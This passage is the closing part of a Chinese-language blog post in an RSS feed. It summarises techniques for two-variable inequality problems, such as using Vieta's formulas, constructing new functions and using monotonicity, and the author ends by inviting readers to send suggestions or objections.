<p>而利用隐含条件借助构造新变量的方法往往有：</p>
<ul>
<li>利用零点、极值定义</li>
<li>利用韦达定理</li>
<li>直接构造</li>
</ul>
<p>消去旧变量的方法往往有：</p>
<ul>
<li>构造新函数，利用新函数单调性</li>
<li>变换待证明的不等式，利用现有函数单调性</li>
<li>利用韦达定理消去一个变量</li>
</ul>
<p>另外，遇到不容易消去单个旧变量是不妨将它们整体代换或放缩为含另一参数的式子（如第 6 题）。</p>
<p>目前而言我还暂没有发现用以上几点思路无法解决的“两点”问题，欢迎路过的学霸君提出建议或异议。</p>
</div>
]]></content>
		</item>
		
	</channel>
</rss>
